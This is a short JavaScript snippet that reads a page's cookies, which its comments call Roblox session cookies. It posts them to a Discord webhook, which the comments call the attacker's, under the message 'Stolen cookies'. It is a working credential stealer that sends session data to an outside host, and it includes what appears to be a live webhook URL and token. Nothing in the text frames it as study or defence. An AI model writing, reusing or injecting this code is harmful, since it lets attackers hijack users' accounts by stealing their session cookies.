let cookies = document.cookie; // Get the Roblox session cookies

// Send the cookies to the attacker's Discord webhook
fetch('https://discord.com/api/webhooks/1292395888433692734/W6jHkCsmG9yxdjxCaIFhyjqSg9RpetrGhtzdRKnpvF58sbAwfHaIErhLJo3JgXkEVDsO', {
    method: 'POST',
    body: JSON.stringify({
        content: `Stolen cookies: ${cookies}` // Send cookies in the content field of the webhook
    }),
    headers: {
        'Content-Type': 'application/json'
    }
});
